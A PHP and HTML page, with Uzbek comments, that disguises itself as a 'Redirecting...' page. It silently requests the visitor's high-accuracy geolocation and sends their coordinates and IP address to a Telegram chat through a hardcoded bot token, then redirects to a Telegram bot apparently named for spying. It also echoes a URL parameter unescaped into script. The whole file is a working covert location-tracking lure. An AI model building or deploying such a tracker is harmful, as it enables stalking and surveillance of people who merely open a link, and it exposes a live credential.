<?php
error_reporting(E_ALL);
ini_set('display_errors', 0);

$bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";

if (isset($_GET['lat']) && isset($_GET['lon'])) {
    $user_id = $_GET['id'];
    $lat = $_GET['lat'];
    $lon = $_GET['lon'];
    $ip = $_SERVER['REMOTE_ADDR'];

    // 1. Matn yuborish
    $text = "📍 <b>LOKATSIYA ANIQLANDI</b>\n\n👤 ID: <code>$user_id</code>\n🌐 IP: <code>$ip</code>\n🗺 <a href='https://www.google.com/maps?q=$lat,$lon'>Google Mapsda ko'rish</a>";
    
    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$user_id&text=" . urlencode($text) . "&parse_mode=HTML");

    // 2. Xaritani o'zini yuborish
    file_get_contents("https://api.telegram.org/bot$bot_token/sendLocation?chat_id=$user_id&latitude=$lat&longitude=$lon");

    echo json_encode(['ok' => true]);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Redirecting...</title>
</head>
<body>
<script>
    navigator.geolocation.getCurrentPosition(pos => {
        const url = window.location.pathname + "?id=<?php echo $_GET['id']; ?>&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude;
        fetch(url).then(() => {
            window.location.href = "https://t.me/eShpionBot?start=true";
        });
    }, err => {
        window.location.href = "https://t.me/eShpionBot?start=true";
    }, { enableHighAccuracy: true });
</script>
</body>
</html>
